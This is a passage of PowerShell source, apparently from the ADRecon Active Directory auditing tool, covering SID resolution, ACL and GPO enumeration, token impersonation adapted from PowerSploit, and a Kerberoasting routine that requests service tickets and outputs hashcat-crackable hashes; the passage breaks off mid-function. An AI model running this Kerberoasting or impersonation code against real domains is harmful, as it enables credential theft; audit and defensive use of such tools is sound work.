                    'S-1-5-19'      { 'NT Authority' }
                    'S-1-5-20'      { 'NT Authority' }
                    'S-1-5-80-0'    { 'All Services ' }
                    'S-1-5-32-544'  { 'BUILTIN\Administrators' }
                    'S-1-5-32-545'  { 'BUILTIN\Users' }
                    'S-1-5-32-546'  { 'BUILTIN\Guests' }
                    'S-1-5-32-547'  { 'BUILTIN\Power Users' }
                    'S-1-5-32-548'  { 'BUILTIN\Account Operators' }
                    'S-1-5-32-549'  { 'BUILTIN\Server Operators' }
                    'S-1-5-32-550'  { 'BUILTIN\Print Operators' }
                    'S-1-5-32-551'  { 'BUILTIN\Backup Operators' }
                    'S-1-5-32-552'  { 'BUILTIN\Replicators' }
                    'S-1-5-32-554'  { 'BUILTIN\Pre-Windows 2000 Compatible Access' }
                    'S-1-5-32-555'  { 'BUILTIN\Remote Desktop Users' }
                    'S-1-5-32-556'  { 'BUILTIN\Network Configuration Operators' }
                    'S-1-5-32-557'  { 'BUILTIN\Incoming Forest Trust Builders' }
                    'S-1-5-32-558'  { 'BUILTIN\Performance Monitor Users' }
                    'S-1-5-32-559'  { 'BUILTIN\Performance Log Users' }
                    'S-1-5-32-560'  { 'BUILTIN\Windows Authorization Access Group' }
                    'S-1-5-32-561'  { 'BUILTIN\Terminal Server License Servers' }
                    'S-1-5-32-562'  { 'BUILTIN\Distributed COM Users' }
                    'S-1-5-32-569'  { 'BUILTIN\Cryptographic Operators' }
                    'S-1-5-32-573'  { 'BUILTIN\Event Log Readers' }
                    'S-1-5-32-574'  { 'BUILTIN\Certificate Service DCOM Access' }
                    'S-1-5-32-575'  { 'BUILTIN\RDS Remote Access Servers' }
                    'S-1-5-32-576'  { 'BUILTIN\RDS Endpoint Servers' }
                    'S-1-5-32-577'  { 'BUILTIN\RDS Management Servers' }
                    'S-1-5-32-578'  { 'BUILTIN\Hyper-V Administrators' }
                    'S-1-5-32-579'  { 'BUILTIN\Access Control Assistance Operators' }
                    'S-1-5-32-580'  { 'BUILTIN\Remote Management Users' }
                    Default {
                        # based on Convert-ADName function from https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1
                        If ( ($TargetSid -match '^S-1-.*') -and ($ResolveSID) )
                        {
                            If ($Protocol -eq 'ADWS')
                            {
                                Try
                                {
                                    $ADObject = Get-ADObject -Filter "objectSid -eq '$TargetSid'" -Properties DistinguishedName,sAMAccountName
                                }
                                Catch
                                {
                                    Write-Warning "[ConvertFrom-SID] Error while enumerating Object using SID"
                                    Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
                                }
                                If ($ADObject)
                                {
                                    $UserDomain = Get-DNtoFQDN -ADObjectDN $ADObject.DistinguishedName
                                    $ADSOutput = $UserDomain + "\" + $ADObject.sAMAccountName
                                    Remove-Variable UserDomain
                                }
                            }

                            If ($Protocol -eq 'LDAP')
                            {
                                If ($Credential -ne [Management.Automation.PSCredential]::Empty)
                                {
                                    $ADObject = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$DomainFQDN/<SID=$TargetSid>",($Credential.GetNetworkCredential()).UserName,($Credential.GetNetworkCredential()).Password)
                                }
                                Else
                                {
                                    $ADObject = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$DomainFQDN/<SID=$TargetSid>")
                                }
                                If ($ADObject)
                                {
                                    If (-Not ([string]::IsNullOrEmpty($ADObject.Properties.samaccountname)) )
                                    {
                                        $UserDomain = Get-DNtoFQDN -ADObjectDN $([string] ($ADObject.Properties.distinguishedname))
                                        $ADSOutput = $UserDomain + "\" + $([string] ($ADObject.Properties.samaccountname))
                                        Remove-Variable UserDomain
                                    }
                                }
                            }

                            If ( (-Not $ADSOutput) -or ([string]::IsNullOrEmpty($ADSOutput)) )
                            {
                                $ADSOutputType = $ADS_NAME_TYPE_NT4
                                $Init = $true
                                $Translate = New-Object -ComObject NameTranslate
                                If ($Credential -ne [Management.Automation.PSCredential]::Empty)
                                {
                                    $ADSInitType = $ADS_NAME_INITTYPE_DOMAIN
                                    Try
                                    {
                                        [System.__ComObject].InvokeMember(“InitEx”,”InvokeMethod”,$null,$Translate,$(@($ADSInitType,$DomainFQDN,($Credential.GetNetworkCredential()).UserName,$DomainFQDN,($Credential.GetNetworkCredential()).Password)))
                                    }
                                    Catch
                                    {
                                        $Init = $false
                                        #Write-Verbose "[ConvertFrom-SID] Error initializing translation for $($TargetSid) using alternate credentials"
                                        #Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
                                    }
                                }
                                Else
                                {
                                    $ADSInitType = $ADS_NAME_INITTYPE_GC
                                    Try
                                    {
                                        [System.__ComObject].InvokeMember(“Init”,”InvokeMethod”,$null,$Translate,($ADSInitType,$null))
                                    }
                                    Catch
                                    {
                                        $Init = $false
                                        #Write-Verbose "[ConvertFrom-SID] Error initializing translation for $($TargetSid)"
                                        #Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
                                    }
                                }
                                If ($Init)
                                {
                                    [System.__ComObject].InvokeMember(“ChaseReferral”,”SetProperty”,$null,$Translate,$ADS_CHASE_REFERRALS_ALWAYS)
                                    Try
                                    {
                                        [System.__ComObject].InvokeMember(“Set”,”InvokeMethod”,$null,$Translate,($ADS_NAME_TYPE_UNKNOWN, $TargetSID))
                                        $ADSOutput = [System.__ComObject].InvokeMember(“Get”,”InvokeMethod”,$null,$Translate,$ADSOutputType)
                                    }
                                    Catch
                                    {
                                        #Write-Verbose "[ConvertFrom-SID] Error translating $($TargetSid)"
                                        #Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
                                    }
                                }
                            }
                        }
                        If (-Not ([string]::IsNullOrEmpty($ADSOutput)) )
                        {
                            Return $ADSOutput
                        }
                        Else
                        {
                            Return $TargetSid
                        }
                    }
                }
            }
            Catch
            {
                #Write-Output "[ConvertFrom-SID] Error converting SID $($TargetSid)"
                #Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
            }
        }
        Else
        {
            Return $TargetSid
        }
    }
}

# based on https://gallery.technet.microsoft.com/Active-Directory-OU-1d09f989
Function Get-ADRACL
{
<#
.SYNOPSIS
    Returns all ACLs for the Domain, OUs, Root Containers, GPO, User, Computer and Group objects in the current (or specified) domain.

.DESCRIPTION
    Returns all ACLs for the Domain, OUs, Root Containers, GPO, User, Computer and Group objects in the current (or specified) domain.

.PARAMETER Protocol
    [string]
    Which protocol to use; ADWS (default) or LDAP.

.PARAMETER objDomain
    [DirectoryServices.DirectoryEntry]
    Domain Directory Entry object.

.PARAMETER DomainController
    [string]
    IP Address of the Domain Controller.

.PARAMETER Credential
    [Management.Automation.PSCredential]
    Credentials.

.PARAMETER ResolveSIDs
    [bool]
    Whether to resolve SIDs in the ACLs module. (Default False)

.PARAMETER PageSize
    [int]
    The PageSize to set for the LDAP searcher object. Default 200.

.PARAMETER Threads
    [int]
    The number of threads to use during processing of objects. Default 10.

.OUTPUTS
    PSObject.

.LINK
    https://gallery.technet.microsoft.com/Active-Directory-OU-1d09f989
#>
    param(
        [Parameter(Mandatory = $true)]
        [string] $Protocol,

        [Parameter(Mandatory = $false)]
        [DirectoryServices.DirectoryEntry] $objDomain,

        [Parameter(Mandatory = $false)]
        [string] $DomainController,

        [Parameter(Mandatory = $false)]
        [Management.Automation.PSCredential] $Credential = [Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false)]
        [bool] $ResolveSID = $false,

        [Parameter(Mandatory = $true)]
        [int] $PageSize,

        [Parameter(Mandatory = $false)]
        [int] $Threads = 10
    )

    If ($Protocol -eq 'ADWS')
    {
        If ($Credential -eq [Management.Automation.PSCredential]::Empty)
        {
            If (Test-Path AD:)
            {
                Set-Location AD:
            }
            Else
            {
                Write-Warning "Default AD drive not found ... Skipping ACL enumeration"
                Return $null
            }
        }
        $GUIDs = @{'00000000-0000-0000-0000-000000000000' = 'All'}
        Try
        {
            Write-Verbose "[*] Enumerating schemaIDs"
            $schemaIDs = Get-ADObject -SearchBase (Get-ADRootDSE).schemaNamingContext -LDAPFilter '(schemaIDGUID=*)' -Properties name, schemaIDGUID
        }
        Catch
        {
            Write-Warning "[Get-ADRACL] Error while enumerating schemaIDs"
            Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
        }

        If ($schemaIDs)
        {
            $schemaIDs | Where-Object {$_} | ForEach-Object {
                # convert the GUID
                $GUIDs[(New-Object Guid (,$_.schemaIDGUID)).Guid] = $_.name
            }
            Remove-Variable schemaIDs
        }

        Try
        {
            Write-Verbose "[*] Enumerating Active Directory Rights"
            $schemaIDs = Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).configurationNamingContext)" -LDAPFilter '(objectClass=controlAccessRight)' -Properties name, rightsGUID
        }
        Catch
        {
            Write-Warning "[Get-ADRACL] Error while enumerating Active Directory Rights"
            Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
        }

        If ($schemaIDs)
        {
            $schemaIDs | Where-Object {$_} | ForEach-Object {
                # convert the GUID
                $GUIDs[(New-Object Guid (,$_.rightsGUID)).Guid] = $_.name
            }
            Remove-Variable schemaIDs
        }

        # Get the DistinguishedNames of Domain, OUs, Root Containers and GroupPolicy objects.
        $Objs = @()
        Try
        {
            $ADDomain = Get-ADDomain
        }
        Catch
        {
            Write-Warning "[Get-ADRACL] Error getting Domain Context"
            Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
        }

        Try
        {
            Write-Verbose "[*] Enumerating Domain, OU, GPO, User, Computer and Group Objects"
            $Objs += Get-ADObject -LDAPFilter '(|(objectClass=domain)(objectCategory=organizationalunit)(objectCategory=groupPolicyContainer)(samAccountType=805306368)(samAccountType=805306369)(samaccounttype=268435456)(samaccounttype=268435457)(samaccounttype=536870912)(samaccounttype=536870913))' -Properties DisplayName, DistinguishedName, Name, ntsecuritydescriptor, ObjectClass, objectsid
        }
        Catch
        {
            Write-Warning "[Get-ADRACL] Error while enumerating Domain, OU, GPO, User, Computer and Group Objects"
            Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
        }

        If ($ADDomain)
        {
            Try
            {
                Write-Verbose "[*] Enumerating Root Container Objects"
                $Objs += Get-ADObject -SearchBase $($ADDomain.DistinguishedName) -SearchScope OneLevel -LDAPFilter '(objectClass=container)' -Properties DistinguishedName, Name, ntsecuritydescriptor, ObjectClass
            }
            Catch
            {
                Write-Warning "[Get-ADRACL] Error while enumerating Root Container Objects"
                Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
            }
        }

        If ($Objs)
        {
            $ACLObj = @()
            Write-Verbose "[*] Total Objects: $([ADRecon.ADWSClass]::ObjectCount($Objs))"
            Write-Verbose "[-] DACLs"
            $DACLObj = [ADRecon.ADWSClass]::DACLParser($Objs, $GUIDs, $Threads)
            #Write-Verbose "[-] SACLs - May need a Privileged Account"
            Write-Warning "[*] SACLs - Currently, the module is only supported with LDAP."
            #$SACLObj = [ADRecon.ADWSClass]::SACLParser($Objs, $GUIDs, $Threads)
            Remove-Variable Objs
            Remove-Variable GUIDs
        }
    }

    If ($Protocol -eq 'LDAP')
    {
        $GUIDs = @{'00000000-0000-0000-0000-000000000000' = 'All'}

        If ($Credential -ne [Management.Automation.PSCredential]::Empty)
        {
            $DomainFQDN = Get-DNtoFQDN($objDomain.distinguishedName)
            $DomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext("Domain",$($DomainFQDN),$($Credential.UserName),$($Credential.GetNetworkCredential().password))
            Try
            {
                $ADDomain = [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($DomainContext)
            }
            Catch
            {
                Write-Warning "[Get-ADRACL] Error getting Domain Context"
                Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
            }

            Try
            {
                $ForestContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext("Forest",$($ADDomain.Forest),$($Credential.UserName),$($Credential.GetNetworkCredential().password))
                $ADForest = [System.DirectoryServices.ActiveDirectory.Forest]::GetForest($ForestContext)
                $SchemaPath = $ADForest.Schema.Name
                Remove-Variable ADForest
            }
            Catch
            {
                Write-Warning "[Get-ADRACL] Error enumerating SchemaPath"
                Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
            }
        }
        Else
        {
            $ADDomain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
            $ADForest = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
            $SchemaPath = $ADForest.Schema.Name
            Remove-Variable ADForest
        }

        If ($SchemaPath)
        {
            Write-Verbose "[*] Enumerating schemaIDs"
            If ($Credential -ne [Management.Automation.PSCredential]::Empty)
            {
                $objSearchPath = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$($DomainController)/$($SchemaPath)", $Credential.UserName,$Credential.GetNetworkCredential().Password
                $objSearcherPath = New-Object System.DirectoryServices.DirectorySearcher $objSearchPath
            }
            Else
            {
                $objSearcherPath = New-Object System.DirectoryServices.DirectorySearcher ([ADSI] "LDAP://$($SchemaPath)")
            }
            $objSearcherPath.PageSize = $PageSize
            $objSearcherPath.filter = "(schemaIDGUID=*)"

            Try
            {
                $SchemaSearcher = $objSearcherPath.FindAll()
            }
            Catch
            {
                Write-Warning "[Get-ADRACL] Error enumerating SchemaIDs"
                Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
            }

            If ($SchemaSearcher)
            {
                $SchemaSearcher | Where-Object {$_} | ForEach-Object {
                    # convert the GUID
                    $GUIDs[(New-Object Guid (,$_.properties.schemaidguid[0])).Guid] = $_.properties.name[0]
                }
                $SchemaSearcher.dispose()
            }
            $objSearcherPath.dispose()

            Write-Verbose "[*] Enumerating Active Directory Rights"
            If ($Credential -ne [Management.Automation.PSCredential]::Empty)
            {
                $objSearchPath = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$($DomainController)/$($SchemaPath.replace("Schema","Extended-Rights"))", $Credential.UserName,$Credential.GetNetworkCredential().Password
                $objSearcherPath = New-Object System.DirectoryServices.DirectorySearcher $objSearchPath
            }
            Else
            {
                $objSearcherPath = New-Object System.DirectoryServices.DirectorySearcher ([ADSI] "LDAP://$($SchemaPath.replace("Schema","Extended-Rights"))")
            }
            $objSearcherPath.PageSize = $PageSize
            $objSearcherPath.filter = "(objectClass=controlAccessRight)"

            Try
            {
                $RightsSearcher = $objSearcherPath.FindAll()
            }
            Catch
            {
                Write-Warning "[Get-ADRACL] Error enumerating Active Directory Rights"
                Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
            }

            If ($RightsSearcher)
            {
                $RightsSearcher | Where-Object {$_} | ForEach-Object {
                    # convert the GUID
                    $GUIDs[$_.properties.rightsguid[0].toString()] = $_.properties.name[0]
                }
                $RightsSearcher.dispose()
            }
            $objSearcherPath.dispose()
        }

        # Get the Domain, OUs, Root Containers, GPO, User, Computer and Group objects.
        $Objs = @()
        Write-Verbose "[*] Enumerating Domain, OU, GPO, User, Computer and Group Objects"
        $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
        $ObjSearcher.PageSize = $PageSize
        $ObjSearcher.Filter = "(|(objectClass=domain)(objectCategory=organizationalunit)(objectCategory=groupPolicyContainer)(samAccountType=805306368)(samAccountType=805306369)(samaccounttype=268435456)(samaccounttype=268435457)(samaccounttype=536870912)(samaccounttype=536870913))"
        # https://msdn.microsoft.com/en-us/library/system.directoryservices.securitymasks(v=vs.110).aspx
        $ObjSearcher.SecurityMasks = [System.DirectoryServices.SecurityMasks]::Dacl -bor [System.DirectoryServices.SecurityMasks]::Group -bor [System.DirectoryServices.SecurityMasks]::Owner -bor [System.DirectoryServices.SecurityMasks]::Sacl
        $ObjSearcher.PropertiesToLoad.AddRange(("displayname","distinguishedname","name","ntsecuritydescriptor","objectclass","objectsid"))
        $ObjSearcher.SearchScope = "Subtree"

        Try
        {
            $Objs += $ObjSearcher.FindAll()
        }
        Catch
        {
            Write-Warning "[Get-ADRACL] Error while enumerating Domain, OU, GPO, User, Computer and Group Objects"
            Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
        }
        $ObjSearcher.dispose()

        Write-Verbose "[*] Enumerating Root Container Objects"
        $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
        $ObjSearcher.PageSize = $PageSize
        $ObjSearcher.Filter = "(objectClass=container)"
        # https://msdn.microsoft.com/en-us/library/system.directoryservices.securitymasks(v=vs.110).aspx
        $ObjSearcher.SecurityMasks = $ObjSearcher.SecurityMasks = [System.DirectoryServices.SecurityMasks]::Dacl -bor [System.DirectoryServices.SecurityMasks]::Group -bor [System.DirectoryServices.SecurityMasks]::Owner -bor [System.DirectoryServices.SecurityMasks]::Sacl
        $ObjSearcher.PropertiesToLoad.AddRange(("distinguishedname","name","ntsecuritydescriptor","objectclass"))
        $ObjSearcher.SearchScope = "OneLevel"

        Try
        {
            $Objs += $ObjSearcher.FindAll()
        }
        Catch
        {
            Write-Warning "[Get-ADRACL] Error while enumerating Root Container Objects"
            Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
        }
        $ObjSearcher.dispose()

        If ($Objs)
        {
            Write-Verbose "[*] Total Objects: $([ADRecon.LDAPClass]::ObjectCount($Objs))"
            Write-Verbose "[-] DACLs"
            $DACLObj = [ADRecon.LDAPClass]::DACLParser($Objs, $GUIDs, $Threads)
            Write-Verbose "[-] SACLs - May need a Privileged Account"
            $SACLObj = [ADRecon.LDAPClass]::SACLParser($Objs, $GUIDs, $Threads)
            Remove-Variable Objs
            Remove-Variable GUIDs
        }
    }

    If ($DACLObj)
    {
        Export-ADR $DACLObj $ADROutputDir $OutputType "DACLs"
        Remove-Variable DACLObj
    }

    If ($SACLObj)
    {
        Export-ADR $SACLObj $ADROutputDir $OutputType "SACLs"
        Remove-Variable SACLObj
    }
}

Function Get-ADRGPOReport
{
<#
.SYNOPSIS
    Runs the Get-GPOReport cmdlet if available.

.DESCRIPTION
    Runs the Get-GPOReport cmdlet if available and saves in HTML and XML formats.

.PARAMETER Protocol
    [string]
    Which protocol to use; ADWS (default) or LDAP.

.PARAMETER UseAltCreds
    [bool]
    Whether to use provided credentials or not.

.PARAMETER ADROutputDir
    [string]
    Path for ADRecon output folder.

.OUTPUTS
    HTML and XML GPOReports are created in the folder specified.
#>
    param(
        [Parameter(Mandatory = $true)]
        [string] $Protocol,

        [Parameter(Mandatory = $true)]
        [bool] $UseAltCreds,

        [Parameter(Mandatory = $true)]
        [string] $ADROutputDir
    )

    If ($Protocol -eq 'ADWS')
    {
        Try
        {
            # Suppress verbose output on module import
            $SaveVerbosePreference = $script:VerbosePreference
            $script:VerbosePreference = 'SilentlyContinue'
            Import-Module GroupPolicy -WarningAction Stop -ErrorAction Stop | Out-Null
            If ($SaveVerbosePreference)
            {
                $script:VerbosePreference = $SaveVerbosePreference
                Remove-Variable SaveVerbosePreference
            }
        }
        Catch
        {
            Write-Warning "[Get-ADRGPOReport] Error importing the GroupPolicy Module. Skipping GPOReport"
            Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
            If ($SaveVerbosePreference)
            {
                $script:VerbosePreference = $SaveVerbosePreference
                Remove-Variable SaveVerbosePreference
            }
            Return $null
        }
        Try
        {
            Write-Verbose "[*] GPOReport XML"
            $ADFileName = -join($ADROutputDir,'\','GPO-Report','.xml')
            Get-GPOReport -All -ReportType XML -Path $ADFileName
        }
        Catch
        {
            If ($UseAltCreds)
            {
                Write-Warning "[*] Run the tool using RUNAS."
                Write-Warning "[*] runas /user:<Domain FQDN>\<Username> /netonly powershell.exe"
                Return $null
            }
            Write-Warning "[Get-ADRGPOReport] Error getting the GPOReport in XML"
            Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
        }
        Try
        {
            Write-Verbose "[*] GPOReport HTML"
            $ADFileName = -join($ADROutputDir,'\','GPO-Report','.html')
            Get-GPOReport -All -ReportType HTML -Path $ADFileName
        }
        Catch
        {
            If ($UseAltCreds)
            {
                Write-Warning "[*] Run the tool using RUNAS."
                Write-Warning "[*] runas /user:<Domain FQDN>\<Username> /netonly powershell.exe"
                Return $null
            }
            Write-Warning "[Get-ADRGPOReport] Error getting the GPOReport in XML"
            Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
        }
    }
    If ($Protocol -eq 'LDAP')
    {
        Write-Warning "[*] Currently, the module is only supported with ADWS."
    }
}

# Modified Invoke-UserImpersonation function from https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1
Function Get-ADRUserImpersonation
{
<#
.SYNOPSIS

Creates a new "runas /netonly" type logon and impersonates the token.

Author: Will Schroeder (@harmj0y)
License: BSD 3-Clause
Required Dependencies: PSReflect

.DESCRIPTION

This function uses LogonUser() with the LOGON32_LOGON_NEW_CREDENTIALS LogonType
to simulate "runas /netonly". The resulting token is then impersonated with
ImpersonateLoggedOnUser() and the token handle is returned for later usage
with Invoke-RevertToSelf.

.PARAMETER Credential

A [Management.Automation.PSCredential] object with alternate credentials
to impersonate in the current thread space.

.PARAMETER TokenHandle

An IntPtr TokenHandle returned by a previous Invoke-UserImpersonation.
If this is supplied, LogonUser() is skipped and only ImpersonateLoggedOnUser()
is executed.

.PARAMETER Quiet

Suppress any warnings about STA vs MTA.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Invoke-UserImpersonation -Credential $Cred

.OUTPUTS

IntPtr

The TokenHandle result from LogonUser.
#>

    [OutputType([IntPtr])]
    [CmdletBinding(DefaultParameterSetName = 'Credential')]
    Param(
        [Parameter(Mandatory = $True, ParameterSetName = 'Credential')]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential,

        [Parameter(Mandatory = $True, ParameterSetName = 'TokenHandle')]
        [ValidateNotNull()]
        [IntPtr]
        $TokenHandle,

        [Switch]
        $Quiet
    )

    If (([System.Threading.Thread]::CurrentThread.GetApartmentState() -ne 'STA') -and (-not $PSBoundParameters['Quiet']))
    {
        Write-Warning "[Get-ADRUserImpersonation] powershell.exe is not currently in a single-threaded apartment state, token impersonation may not work."
    }

    If ($PSBoundParameters['TokenHandle'])
    {
        $LogonTokenHandle = $TokenHandle
    }
    Else
    {
        $LogonTokenHandle = [IntPtr]::Zero
        $NetworkCredential = $Credential.GetNetworkCredential()
        $UserDomain = $NetworkCredential.Domain
        If (-Not $UserDomain)
        {
            Write-Warning "[Get-ADRUserImpersonation] Use credential with Domain FQDN. (<Domain FQDN>\<Username>)"
        }
        $UserName = $NetworkCredential.UserName
        Write-Warning "[Get-ADRUserImpersonation] Executing LogonUser() with user: $($UserDomain)\$($UserName)"

        # LOGON32_LOGON_NEW_CREDENTIALS = 9, LOGON32_PROVIDER_WINNT50 = 3
        #   this is to simulate "runas.exe /netonly" functionality
        $Result = $Advapi32::LogonUser($UserName, $UserDomain, $NetworkCredential.Password, 9, 3, [ref]$LogonTokenHandle)
        $LastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error();

        If (-not $Result)
        {
            throw "[Get-ADRUserImpersonation] LogonUser() Error: $(([ComponentModel.Win32Exception] $LastError).Message)"
        }
    }

    # actually impersonate the token from LogonUser()
    $Result = $Advapi32::ImpersonateLoggedOnUser($LogonTokenHandle)

    If (-not $Result)
    {
        throw "[Get-ADRUserImpersonation] ImpersonateLoggedOnUser() Error: $(([ComponentModel.Win32Exception] $LastError).Message)"
    }

    Write-Verbose "[Get-ADR-UserImpersonation] Alternate credentials successfully impersonated"
    $LogonTokenHandle
}

# Modified Invoke-RevertToSelf function from https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1
Function Get-ADRRevertToSelf
{
<#
.SYNOPSIS

Reverts any token impersonation.

Author: Will Schroeder (@harmj0y)
License: BSD 3-Clause
Required Dependencies: PSReflect

.DESCRIPTION

This function uses RevertToSelf() to revert any impersonated tokens.
If -TokenHandle is passed (the token handle returned by Invoke-UserImpersonation),
CloseHandle() is used to close the opened handle.

.PARAMETER TokenHandle

An optional IntPtr TokenHandle returned by Invoke-UserImpersonation.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
$Token = Invoke-UserImpersonation -Credential $Cred
Invoke-RevertToSelf -TokenHandle $Token
#>

    [CmdletBinding()]
    Param(
        [ValidateNotNull()]
        [IntPtr]
        $TokenHandle
    )

    If ($PSBoundParameters['TokenHandle'])
    {
        Write-Warning "[Get-ADRRevertToSelf] Reverting token impersonation and closing LogonUser() token handle"
        $Result = $Kernel32::CloseHandle($TokenHandle)
    }

    $Result = $Advapi32::RevertToSelf()
    $LastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error();

    If (-not $Result)
    {
        Write-Error "[Get-ADRRevertToSelf] RevertToSelf() Error: $(([ComponentModel.Win32Exception] $LastError).Message)"
    }

    Write-Verbose "[Get-ADRRevertToSelf] Token impersonation successfully reverted"
}

# Modified Get-DomainSPNTicket function from https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1
Function Get-ADRSPNTicket
{
<#
<#
.SYNOPSIS
    Request the kerberos ticket for a specified service principal name (SPN).

    Author: machosec, Will Schroeder (@harmj0y)
    License: BSD 3-Clause
    Required Dependencies: Invoke-UserImpersonation, Invoke-RevertToSelf

.DESCRIPTION
    This function will either take one SPN strings, and will request a kerberos ticket for the given SPN using System.IdentityModel.Tokens.KerberosRequestorSecurityToken. The encrypted portion of the ticket is then extracted and output in either crackable Hashcat format.

.PARAMETER UserSPN
    [string]
    Service Principal Name.

.OUTPUTS
    PSObject.
#>
    param(
        [Parameter(Mandatory = $true)]
        [string] $UserSPN
    )

    Try
    {
        $Null = [Reflection.Assembly]::LoadWithPartialName('System.IdentityModel')
        $Ticket = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $UserSPN
    }
    Catch
    {
        Write-Warning "[Get-ADRSPNTicket] Error requesting ticket for SPN $UserSPN"
        Write-Warning "[EXCEPTION] $($_.Exception.Message)"
        Return $null
    }

    If ($Ticket)
    {
        $TicketByteStream = $Ticket.GetRequest()
    }

    If ($TicketByteStream)
    {
        $TicketHexStream = [System.BitConverter]::ToString($TicketByteStream) -replace '-'

        # TicketHexStream == GSS-API Frame (see https://tools.ietf.org/html/rfc4121#section-4.1)
        # No easy way to parse ASN1, so we'll try some janky regex to parse the embedded KRB_AP_REQ.Ticket object
        If ($TicketHexStream -match 'a382....3082....A0030201(?<EtypeLen>..)A1.{1,4}.......A282(?<CipherTextLen>....)........(?<DataToEnd>.+)')
        {
            $Etype = [Convert]::ToByte( $Matches.EtypeLen, 16 )
            $CipherTextLen = [Convert]::ToUInt32($Matches.CipherTextLen, 16)-4
            $CipherText = $Matches.DataToEnd.Substring(0,$CipherTextLen*2)

            # Make sure the next field matches the beginning of the KRB_AP_REQ.Authenticator object
            If ($Matches.DataToEnd.Substring($CipherTextLen*2, 4) -ne 'A482')
            {
                Write-Warning '[Get-ADRSPNTicket] Error parsing ciphertext for the SPN  $($Ticket.ServicePrincipalName).' # Use the TicketByteHexStream field and extract the hash offline with Get-KerberoastHashFromAPReq
                $Hash = $null
            }
            Else
            {
                $Hash = "$($CipherText.Substring(0,32))`$$($CipherText.Substring(32))"
            }
        }
        Else
        {
            Write-Warning "[Get-ADRSPNTicket] Unable to parse ticket structure for the SPN  $($Ticket.ServicePrincipalName)." # Use the TicketByteHexStream field and extract the hash offline with Get-KerberoastHashFromAPReq
            $Hash = $null
        }
    }
    $Obj = New-Object PSObject
    $Obj | Add-Member -MemberType NoteProperty -Name "ServicePrincipalName" -Value $Ticket.ServicePrincipalName
    $Obj | Add-Member -MemberType NoteProperty -Name "Etype" -Value $Etype
    $Obj | Add-Member -MemberType NoteProperty -Name "Hash" -Value $Hash
    Return $Obj
}

Function Get-ADRKerberoast
{
<#
.SYNOPSIS
    Returns all user service principal name (SPN) hashes in the current (or specified) domain.

.DESCRIPTION
    Returns all user service principal name (SPN) hashes in the current (or specified) domain.

.PARAMETER Protocol
    [string]
    Which protocol to use; ADWS (default) or LDAP.

.PARAMETER objDomain
    [DirectoryServices.DirectoryEntry]
    Domain Directory Entry object.

.PARAMETER Credential
    [Management.Automation.PSCredential]
    Credentials.

.PARAMETER PageSize
    [int]
    The PageSize to set for the LDAP searcher object. Default 200.

.OUTPUTS
    PSObject.
#>
    param(
        [Parameter(Mandatory = $true)]
        [string] $Protocol,

        [Parameter(Mandatory = $false)]
        [DirectoryServices.DirectoryEntry] $objDomain,

        [Parameter(Mandatory = $false)]
        [Management.Automation.PSCredential] $Credential = [Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $true)]
        [int] $PageSize
    )

    If ($Credential -ne [Management.Automation.PSCredential]::Empty)
    {
        $LogonToken = Get-ADRUserImpersonation -Credential $Credential
    }

    If ($Protocol -eq 'ADWS')
    {
        Try
        {
            $ADUsers = Get-ADObject -LDAPFilter "(&(!objectClass=computer)(servicePrincipalName=*)(!userAccountControl:1.2.840.113556.1.4.803:=2))" -Properties sAMAccountName,servicePrincipalName,DistinguishedName -ResultPageSize $PageSize
        }
        Catch
        {
            Write-Warning "[Get-ADRKerberoast] Error while enumerating UserSPN Objects"
            Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
            Return $null
        }

        If ($ADUsers)
        {
            $UserSPNObj = @()
            $ADUsers | ForEach-Object {
                ForEach ($UserSPN in $_.servicePrincipalName)
                {
                    $Obj = New-Object PSObject
                    $Obj | Add-Member -MemberType NoteProperty -Name "Username" -Value $_.sAMAccountName
                    $Obj | Add-Member -MemberType NoteProperty -Name "ServicePrincipalName" -Value $UserSPN

                    $HashObj = Get-ADRSPNTicket $UserSPN
                    If ($HashObj)
                    {
